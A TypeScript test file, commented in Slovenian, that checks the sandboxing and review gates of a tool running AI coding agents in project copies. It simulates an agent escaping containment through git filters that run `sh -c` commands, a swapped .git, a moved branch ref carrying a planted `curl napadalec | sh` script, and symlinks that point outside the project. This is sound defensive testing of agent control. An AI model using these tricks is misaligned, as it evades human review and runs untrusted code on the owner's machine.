/**
 * Popravki najdb slepega pregleda agentov (24. 11. 2026, pregled-vecer-1405/agenti/NAJDBE.md). Preizkusi pregledovalca, obrnjeni v pravilno
 * vedenje: vsak brez popravka pade. Pravi git na zacasnih repozitorijih pod $HOME; agenti in terminal so nadomestki.
 */
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import path from "node:path";
import { describe, it } from "node:test";
import { setupOwner } from "./auth.server.ts";
import { potrdiOpozorilo } from "./opozorilo.server.ts";
import { AGENTI, ocistiBesediloNaloge, ocistiPorocilo, terminalZaseda, type ZapisNaloge } from "./claude-naloge.ts";
import { besediloPopravka } from "./claude-naloge-vodja.ts";
import { ukazClaudeNalog, ovojPreizkusa, type Odvisnosti } from "./claude-naloge.server.ts";
import { diffKopije, privzetoIzvedi, uveljavi, ustvariKopijo, zdruzi, type DepsVodje } from "./claude-naloge-vodja.server.ts";
import { ukazTerminala } from "./platforma.server.ts";

const KOREN = mkdtempSync(path.join(process.env.HOME && existsSync(process.env.HOME) ? process.env.HOME : homedir(), "lina-popravki-"));

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", ["-c", "user.name=P", "-c", "user.email=p@example.invalid", "-c", "commit.gpgsign=false", ...args], {
    cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null" },
  }).trim();
}

const najdi = (x: string) => {
  try {
    return execFileSync("which", [x], { encoding: "utf8" }).trim() || null;
  } catch {
    return null;
  }
};

function deps(): DepsVodje {
  return {
    najdi: (x) => (x === "systemd-run" ? "/usr/bin/systemd-run" : najdi(x)),
    platforma: "linux",
    izvedi: privzetoIzvedi,
    izvediPreizkus: async () => ({ koda: 0, izpis: "", potekel: false, napaka: "" }),
    okolje: { PATH: process.env.PATH, HOME: process.env.HOME, GIT_CONFIG_NOSYSTEM: "1", GIT_TERMINAL_PROMPT: "0" },
  };
}

function repo(ime: string) {
  const osnova = path.join(KOREN, ime);
  const projekt = path.join(osnova, "projekt");
  const podatki = path.join(osnova, "podatki");
  mkdirSync(projekt, { recursive: true });
  mkdirSync(podatki, { recursive: true });
  writeFileSync(path.join(projekt, "a.txt"), "ena\n");
  git(projekt, "init", "-q", "-b", "glavna");
  git(projekt, "add", "-A");
  git(projekt, "commit", "-q", "-m", "zacetek");
  return { osnova, projekt, podatki };
}

/** Okolje za ukazClaudeNalog z nadomestnim terminalom in bwrap; vrne klice zagona. */
async function okoljeNalog(ime: string, zazeniPid: number | null = process.pid) {
  const osnova = path.join(KOREN, ime);
  const dom = path.join(osnova, "dom");
  const podatki = path.join(osnova, "podatki");
  const projekt = path.join(dom, "projekt");
  mkdirSync(projekt, { recursive: true });
  mkdirSync(podatki, { recursive: true });
  mkdirSync(path.join(dom, ".claude"), { recursive: true });
  mkdirSync(path.join(dom, ".ssh"), { recursive: true });
  mkdirSync(path.join(dom, ".gemini"), { recursive: true });
  writeFileSync(path.join(dom, ".Xauthority"), "piskotek");
  writeFileSync(path.join(projekt, "a.txt"), "x\n");
  const token = await setupOwner("geslo-test-1234", podatki);
  await potrdiOpozorilo(podatki);
  const klici: { program: string; args: readonly string[]; cwd: string }[] = [];
  const preverbe: { program: string; args: readonly string[] }[] = [];
  const o: Odvisnosti = {
    dom, platforma: "linux", zagonLine: new Date("2026-11-24T07:00:00Z"),
    najdi: (x) => (["xterm", "bwrap", ...AGENTI].includes(x as never) ? `/usr/bin/${x}` : ["git", "diff", "patch"].includes(x) ? najdi(x) : null),
    preveriZagon: async (program, args) => {
      preverbe.push({ program, args });
      return { koda: 0, izpis: "1.0.0", potekel: false };
    },
    zazeni: async (program, args, cwd) => {
      klici.push({ program, args, cwd });
      return zazeniPid ?? undefined;
    },
    casZagona: () => "1",
  };
  const T = new Date("2026-11-24T08:00:00Z");
  const u = (x: Record<string, unknown>, cas = T) => ukazClaudeNalog(token, x, podatki, o, cas);
  return { dom, podatki, projekt, klici, preverbe, o, u, T, token };
}

const zastavice = (a: readonly string[], z: string) => a.flatMap((x, i) => (x === z ? [a[i + 1]!] : []));

describe("N1: git filter iz skupnega .git se v Lini NE izvede (fail-closed)", () => {
  it("filter.clean v .git/config izvirnika + .gitattributes v kopiji: diffKopije zavrne, ukaz se ne izvede", async () => {
    const r = repo("filter");
    const d = deps();
    const id = "0123456789abcdef";
    const k = await ustvariKopijo(d, r.podatki, id, r.projekt);
    assert.equal(k.git, true);
    const znak = path.join(r.osnova, "IZVEDENO-ZUNAJ-PESKOVNIKA");
    git(r.projekt, "config", "filter.x.clean", `sh -c 'id > ${znak}; cat'`);
    writeFileSync(path.join(k.kopija, ".gitattributes"), "* filter=x\n");
    writeFileSync(path.join(k.kopija, "a.txt"), "ena\ndva\n");
    await assert.rejects(diffKopije(d, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1), /git nastavitve/);
    assert.equal(existsSync(znak), false, "filter se je izvedel");
  });

  it("filter.smudge v nastavitvi izvirnika: uveljavi zavrne pred git merge", async () => {
    const r = repo("filter-uveljavi");
    const d = deps();
    const id = "0123456789abcdee";
    const k = await ustvariKopijo(d, r.podatki, id, r.projekt);
    writeFileSync(path.join(k.kopija, "a.txt"), "ena\ndva\n");
    const df = await diffKopije(d, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1);
    const vodja = { projekt: r.projekt, git: true, osnova: k.osnova, faza: "zdruzi" as const, krog: 1, najdbe: 0, pregledovalec: "claude" as const, diff: df.sha, glava: df.glava };
    const z = await zdruzi(d, r.podatki, undefined, { id, vodja }, df.pot, [["true"]]);
    assert.equal(z.izid, "ok");
    const znak = path.join(r.osnova, "SMUDGE");
    git(r.projekt, "config", "filter.y.smudge", `sh -c 'id > ${znak}; cat'`);
    await assert.rejects(uveljavi(d, r.podatki, z.zd, z.zd.zgostitev!), /git nastavitve/);
    assert.equal(existsSync(znak), false);
  });
});

describe("N1b: zamenjan .git kopije (lasten repozitorij agenta) se zavrne", () => {
  it("kopija/.git -> lasten repo na veji lina/<id> s filter.clean: diffKopije zavrne, filter se ne izvede", async () => {
    const r = repo("lasten-git");
    const d = deps();
    const id = "4444444444444444";
    const k = await ustvariKopijo(d, r.podatki, id, r.projekt);
    const znak = path.join(r.osnova, "IZVEDENO-BREZ-IZVIRNIKA");
    rmSync(path.join(k.kopija, ".git"));
    git(k.kopija, "init", "-q", "-b", `lina/${id}`);
    git(k.kopija, "commit", "-q", "--allow-empty", "-m", "zacetek");
    writeFileSync(path.join(k.kopija, ".gitattributes"), "* filter=x\n");
    git(k.kopija, "config", "filter.x.clean", `sh -c 'id > ${znak}; cat'`);
    await assert.rejects(diffKopije(d, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1), /git kopije/);
    assert.equal(existsSync(znak), false, "filter se je izvedel");
  });

  it("brez nevarnih nastavitev diffKopije dela kot prej (ni lazno pozitivno, tudi z obicajnimi kljuci klona)", async () => {
    const r = repo("cist-git");
    for (const [k, v] of [["remote.origin.url", "https://example.invalid/r.git"], ["remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/*"],
      ["remote.origin.prune", "true"], ["remote.origin.gh-resolved", "base"], ["branch.glavna.remote", "origin"], ["branch.glavna.merge", "refs/heads/glavna"],
      ["branch.glavna.vscode-merge-base", "origin/glavna"], ["branch.glavna.description", "opis"]]) git(r.projekt, "config", k!, v!);
    const d = deps();
    const id = "4444444444444445";
    const k = await ustvariKopijo(d, r.podatki, id, r.projekt);
    assert.equal(k.git, true, "obicajne nastavitve klona ne smejo pasti na kopijo mape");
    writeFileSync(path.join(k.kopija, "a.txt"), "ena\ndva\n");
    const df = await diffKopije(d, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1);
    assert.equal(df.prazen, false);
    assert.match(readFileSync(df.pot, "utf8"), /\+dva/);
  });
});

describe("N2: »Uveljavi« zdruzi natanko pregledani commit, ne veje", () => {
  it("agent premakne refs/heads/lina/zdruzitev-*: uveljavi zavrne, nepregledana datoteka ne pride v izvirnik", async () => {
    const r = repo("veja");
    const d = deps();
    const id = "1111111111111111";
    const k = await ustvariKopijo(d, r.podatki, id, r.projekt);
    writeFileSync(path.join(k.kopija, "a.txt"), "ena\npregledano\n");
    const df = await diffKopije(d, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1);
    const vodja = { projekt: r.projekt, git: true, osnova: k.osnova, faza: "zdruzi" as const, krog: 1, najdbe: 0, pregledovalec: "claude" as const, diff: df.sha, glava: df.glava };
    const z = await zdruzi(d, r.podatki, undefined, { id, vodja }, df.pot, [["true"]]);
    assert.equal(z.izid, "ok");
    writeFileSync(path.join(k.kopija, "zlo.sh"), "curl napadalec | sh\n");
    git(k.kopija, "add", "zlo.sh");
    git(k.kopija, "commit", "-q", "-m", "nepregledano");
    git(r.projekt, "update-ref", `refs/heads/${z.zd.veja}`, git(k.kopija, "rev-parse", "HEAD"));
    await assert.rejects(uveljavi(d, r.podatki, z.zd, z.zd.zgostitev!), /izvirnik/);
    assert.equal(existsSync(path.join(r.projekt, "zlo.sh")), false, "nepregledana datoteka je v izvirniku");
  });

  it("brez premika veje uveljavi prinese natanko pregledano vsebino", async () => {
    const r = repo("veja-ok");
    const d = deps();
    const id = "1111111111111112";
    const k = await ustvariKopijo(d, r.podatki, id, r.projekt);
    writeFileSync(path.join(k.kopija, "a.txt"), "ena\npregledano\n");
    const df = await diffKopije(d, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1);
    const vodja = { projekt: r.projekt, git: true, osnova: k.osnova, faza: "zdruzi" as const, krog: 1, najdbe: 0, pregledovalec: "claude" as const, diff: df.sha, glava: df.glava };
    const z = await zdruzi(d, r.podatki, undefined, { id, vodja }, df.pot, [["true"]]);
    await uveljavi(d, r.podatki, z.zd, z.zd.zgostitev!);
    assert.equal(git(r.projekt, "rev-parse", "HEAD"), z.zd.glava);
    assert.equal(readFileSync(path.join(r.projekt, "a.txt"), "utf8"), "ena\npregledano\n");
  });
});

describe("N3/N7/N9/N10: peskovnik agenta v kopiji", () => {
  it("agy v kopiji: izvirnik ni zapisljiv, podatki Line in kljuci doma so skriti, brez omrezja, nastavitve samo za branje", async () => {
    const e = await okoljeNalog("peskovnik");
    await e.u({ ukaz: "dodeli", agent: "claude", mapa: e.projekt, besedilo: "prva", pogoj: "zdaj" });
    await e.u({ ukaz: "dodeli", agent: "agy", mapa: e.projekt, besedilo: "druga", pogoj: "zdaj" });
    assert.equal(e.klici.length, 2, JSON.stringify(e.klici.map((k) => k.cwd)));
    const a = e.klici[1]!.args;
    assert.ok(e.klici[1]!.cwd.startsWith(path.join(e.podatki, "delo")), "agy ni v kopiji");
    const zapisljive = zastavice(a, "--bind");
    // N3 (in N9: node_modules kopije kaze v izvirnik, ki zato ostane samo za branje)
    assert.ok(!zapisljive.includes(e.projekt), `izvirnik je zapisljiv: ${zapisljive}`);
    assert.deepEqual(zapisljive.filter((p) => p !== path.join(e.dom, ".gemini")), [e.klici[1]!.cwd]);
    const skrite = zastavice(a, "--tmpfs");
    for (const p of [e.podatki, path.join(e.dom, ".claude"), path.join(e.dom, ".ssh")]) assert.ok(skrite.includes(p), `${p} ni skrit: ${skrite}`);
    // podatki Line skriti PRED vezavo kopije (kopija je pod podatki)
    assert.ok(a.indexOf(e.podatki) < a.lastIndexOf(e.klici[1]!.cwd));
    // N7 (vodja 24. 11., popravki-1605): agent ima omrezje (brez pasta = omrezje gostitelja); piskotek X11 ostane skrit
    assert.ok(!a.includes("--unshare-net"), "agent brez omrezja ne doseze ponudnika");
    assert.ok(zastavice(a, "--ro-bind").includes("/dev/null") && a.includes(path.join(e.dom, ".Xauthority")), ".Xauthority ni skrit");
    // N10 (vodja 24. 11., popravki-1605): lastne nastavitve agenta zapisljive (prijava, zgodovina), skrivanje sledi za njimi
    assert.ok(zastavice(a, "--bind").includes(path.join(e.dom, ".gemini")), "nastavitve niso zapisljive");
    assert.ok(a.indexOf(path.join(e.dom, ".gemini")) < a.indexOf(path.join(e.dom, ".ssh")), "nastavitve vezane za skrivanjem");
  });

  it("N10: preverba --version agenta z omejenimi mapami tece v peskovniku", async () => {
    const e = await okoljeNalog("preverba");
    await e.u({ ukaz: "preveri-agente" });
    const agy = e.preverbe.filter((p) => p.args.includes("/usr/bin/agy"));
    assert.ok(agy.length > 0, JSON.stringify(e.preverbe.map((p) => [p.program, ...p.args.slice(-2)])));
    assert.ok(agy.every((p) => p.program === "/usr/bin/bwrap"));
    assert.ok(!e.preverbe.some((p) => p.program === "/usr/bin/agy"), "agy preverjen brez peskovnika");
  });
});

describe("N4: preizkusi zdruzitve dela agenta z omejenimi mapami tecejo v peskovniku", () => {
  it("zdruzi z omejeno=true: argv preizkusa = systemd-run ... bwrap ... --; brez peskovnika se ne pozene", async () => {
    const r = repo("preizkus-peskovnik");
    const zagoni: string[][] = [];
    const id = "6666666666666666";
    const d0 = deps();
    const k = await ustvariKopijo(d0, r.podatki, id, r.projekt);
    writeFileSync(path.join(k.kopija, "a.txt"), "ena\ndva\n");
    const df = await diffKopije(d0, r.podatki, id, k.kopija, { git: true, osnova: k.osnova, projekt: r.projekt }, 1);
    const vodja = { projekt: r.projekt, git: true, osnova: k.osnova, faza: "zdruzi" as const, krog: 1, najdbe: 0, pregledovalec: "claude" as const, diff: df.sha, glava: df.glava };
    const brez = { ...d0, izvediPreizkus: async (p: string, a: readonly string[]) => (zagoni.push([p, ...a]), { koda: 0, izpis: "", potekel: false, napaka: "" }) };
    const z0 = await zdruzi(brez, r.podatki, undefined, { id, vodja, omejeno: true }, df.pot, [["npm", "test"]]);
    assert.equal(z0.izid, "brez-peskovnika");
    assert.equal(zagoni.length as number, 0, "preizkus brez peskovnika");
    const s = { ...brez, peskovnik: async (mapa: string) => ["/usr/bin/bwrap", "--unshare-net", "--bind", mapa, mapa, "--"] };
    const z = await zdruzi(s, r.podatki, undefined, { id, vodja, omejeno: true }, df.pot, [["npm", "test"]]);
    assert.equal(z.izid, "ok");
    assert.equal(z.zd.omejeno, true);
    assert.equal(zagoni.length as number, 1);
    assert.ok(zagoni[0]![0]!.endsWith("systemd-run") && zagoni[0]!.includes("/usr/bin/bwrap"), JSON.stringify(zagoni));
  });

  it("ovojPreizkusa: bwrap brez omrezja, podatki Line skriti, zapisljiva samo mapa zdruzitve", async () => {
    const e = await okoljeNalog("ovoj-preizkusa");
    const mapa = path.join(e.podatki, "delo", "zdruzitev-abc", "delo");
    mkdirSync(mapa, { recursive: true });
    const a = await ovojPreizkusa(e.podatki, e.o, mapa);
    assert.ok(a && a[0] === "/usr/bin/bwrap" && a.at(-1) === "--");
    assert.ok(a.includes("--unshare-net"));
    assert.deepEqual(zastavice(a, "--bind"), [mapa]);
    assert.ok(zastavice(a, "--tmpfs").includes(e.podatki));
    assert.ok(a.includes("DBUS_SESSION_BUS_ADDRESS"));
  });
});

describe("N5: z znanim zivim PID agent ni koncan ob oceni; gnome-terminal z --wait", () => {
  it("znan ziv PID: porocilo takoj + 31 min -> se tece; druga naloga v isti mapi ne dobi izvirnika", async () => {
    const { korakRazporejevalnika, stanjeClaudeNalog } = await import("./claude-naloge.server.ts");
    // tocka 4 (vodja 24. 11.): neznan PID ima rok = ocena konca; A2 zapira znan PID (vsi terminali s seznama ga dajo)
    const e = await okoljeNalog("brez-pid", process.pid);
    const s1 = await e.u({ ukaz: "dodeli", agent: "claude", mapa: e.projekt, besedilo: "dolga naloga", pogoj: "zdaj" });
    const id = s1.naloge[0]!.id;
    writeFileSync(path.join(e.projekt, ".lina-naloge", id, "POROCILO.md"), "Koncano.");
    const T31 = new Date(e.T.getTime() + 31 * 60_000);
    await korakRazporejevalnika(e.podatki, e.o, T31);
    const st = (await stanjeClaudeNalog(e.token, e.podatki, e.o, T31)).naloge.find((n) => n.id === id)!;
    assert.equal(st.stanje, "tece");
    await e.u({ ukaz: "dodeli", agent: "pi", mapa: e.projekt, besedilo: "druga", pogoj: "zdaj" }, T31);
    assert.notEqual(e.klici[1]?.cwd, e.projekt, "drugi agent je v izvirniku");
  });

  it("terminalZaseda: znan ziv PID zaseda tudi po oceni; neznan PID samo do ocene (tocka 4)", () => {
    const z = { stanje: "tece", potrjeno: "2026-11-24T08:00:00.000Z", ocena: { konec: "2026-11-24T08:10:00.000Z", groba: true } } as unknown as ZapisNaloge;
    assert.equal(terminalZaseda({ ...z, pid: 1234 }, true, new Date("2026-11-24T09:00:00Z")), true);
    assert.equal(terminalZaseda(z, false, new Date("2026-11-24T09:00:00Z")), false);
  });

  it("gnome-terminal z --wait, xfce4-terminal z --disable-server (PID ostane znan)", () => {
    const t = ukazTerminala((x) => (x === "gnome-terminal" ? "/usr/bin/gnome-terminal" : null), "linux");
    assert.deepEqual("predpona" in t ? t.predpona : null, ["--wait", "--"]);
    const x = ukazTerminala((n) => (n === "xfce4-terminal" ? "/usr/bin/xfce4-terminal" : null), "linux");
    assert.deepEqual("predpona" in x ? x.predpona : null, ["--disable-server", "-x"]);
  });
});

describe("N6: »Uveljavi« brez gita zavrne, ce izvirnik ni enak posnetku osnove", () => {
  it("lastnik vmes spremeni izvirnik: uveljavi -> izvirnik, datoteka ostane lastnikova", async () => {
    const osnova = path.join(KOREN, "brez-gita");
    const projekt = path.join(osnova, "projekt");
    const podatki = path.join(osnova, "podatki");
    mkdirSync(projekt, { recursive: true });
    mkdirSync(podatki, { recursive: true });
    const vrstice = Array.from({ length: 12 }, (_, i) => `vrstica ${i + 1}`);
    writeFileSync(path.join(projekt, "a.txt"), vrstice.join("\n") + "\n");
    const d = deps();
    const id = "2222222222222222";
    const k = await ustvariKopijo(d, podatki, id, projekt);
    assert.equal(k.git, false);
    const agent = [...vrstice];
    agent[5] = "vrstica 6 AGENT";
    writeFileSync(path.join(k.kopija, "a.txt"), agent.join("\n") + "\n");
    const df = await diffKopije(d, podatki, id, k.kopija, { git: false, osnova: k.osnova, projekt }, 1);
    const vodja = { projekt, git: false, osnova: k.osnova, faza: "zdruzi" as const, krog: 1, najdbe: 0, pregledovalec: "claude" as const, diff: df.sha };
    const z = await zdruzi(d, podatki, undefined, { id, vodja }, df.pot, [["true"]]);
    assert.equal(z.izid, "ok");
    const lastnik = ["NOVO 1", "NOVO 2", ...vrstice];
    lastnik[5] = "vrstica 4 LASTNIK";
    writeFileSync(path.join(projekt, "a.txt"), lastnik.join("\n") + "\n");
    await assert.rejects(uveljavi(d, podatki, z.zd, z.zd.zgostitev!), /izvirnik/);
    assert.equal(readFileSync(path.join(projekt, "a.txt"), "utf8"), lastnik.join("\n") + "\n");
    // nespremenjen izvirnik: uveljavi uspe
    writeFileSync(path.join(projekt, "a.txt"), vrstice.join("\n") + "\n");
    await uveljavi(d, podatki, z.zd, z.zd.zgostitev!);
    assert.match(readFileSync(path.join(projekt, "a.txt"), "utf8"), /vrstica 6 AGENT/);
  });
});

describe("N8: najdbe z nevidnim znakom pridejo do popravka (vidna oznaka)", () => {
  it("besediloPopravka zamenja U+200B z <U+200B>; ocistiBesediloNaloge ga sprejme", () => {
    const porocilo = ocistiPorocilo("NAJDBE: 1\n1. a.ts:3 VISOKA - niz `admin​` obide preverbo imena.\n");
    const b = besediloPopravka(porocilo);
    const c = ocistiBesediloNaloge(b);
    assert.ok(c, "besedilo popravka zavrnjeno");
    assert.match(c!, /admin<U\+200B>/);
    assert.match(c!, /obide preverbo imena/);
  });
});

describe("N11: pot brez gita - binarne datoteke, povezave ven, napaka diff", () => {
  it("projekt s povezavo na mapo zunaj: kopija se zavrne (zapis bi sel mimo pregleda)", async () => {
    const osnova = path.join(KOREN, "povezava-ven");
    const projekt = path.join(osnova, "projekt");
    const podatki = path.join(osnova, "podatki");
    const zunaj = path.join(osnova, "zunaj");
    for (const m of [projekt, podatki, zunaj]) mkdirSync(m, { recursive: true });
    writeFileSync(path.join(projekt, "a.txt"), "ena\n");
    symlinkSync(zunaj, path.join(projekt, "skupno"));
    await assert.rejects(ustvariKopijo(deps(), podatki, "5555555555555550", projekt), /povezava/);
    // povezava znotraj projekta je dovoljena
    rmSync(path.join(projekt, "skupno"));
    symlinkSync("a.txt", path.join(projekt, "b.txt"));
    const k = await ustvariKopijo(deps(), podatki, "5555555555555551", projekt);
    assert.ok(lstatSync(path.join(k.kopija, "b.txt")).isSymbolicLink());
  });

  it("binarna sprememba: diff se zavrne (nikoli »ok« z manjkajocim delom); nova povezava: napaka ima besedilo", async () => {
    const osnova = path.join(KOREN, "binarno");
    const projekt = path.join(osnova, "projekt");
    const podatki = path.join(osnova, "podatki");
    mkdirSync(projekt, { recursive: true });
    mkdirSync(podatki, { recursive: true });
    writeFileSync(path.join(projekt, "a.txt"), "ena\n");
    writeFileSync(path.join(projekt, "slika.bin"), Buffer.from([0, 1, 2, 3]));
    const d = deps();
    const k = await ustvariKopijo(d, podatki, "5555555555555555", projekt);
    writeFileSync(path.join(k.kopija, "slika.bin"), Buffer.from([0, 9, 9, 9]));
    await assert.rejects(diffKopije(d, podatki, "5555555555555555", k.kopija, { git: false, osnova: k.osnova, projekt }, 1), /binarn/);
    const k2 = await ustvariKopijo(d, podatki, "5555555555555556", projekt);
    symlinkSync("a.txt", path.join(k2.kopija, "nova-povezava"));
    await assert.rejects(diffKopije(d, podatki, "5555555555555556", k2.kopija, { git: false, osnova: k2.osnova, projekt }, 1), /diff: .+/);
  });
});
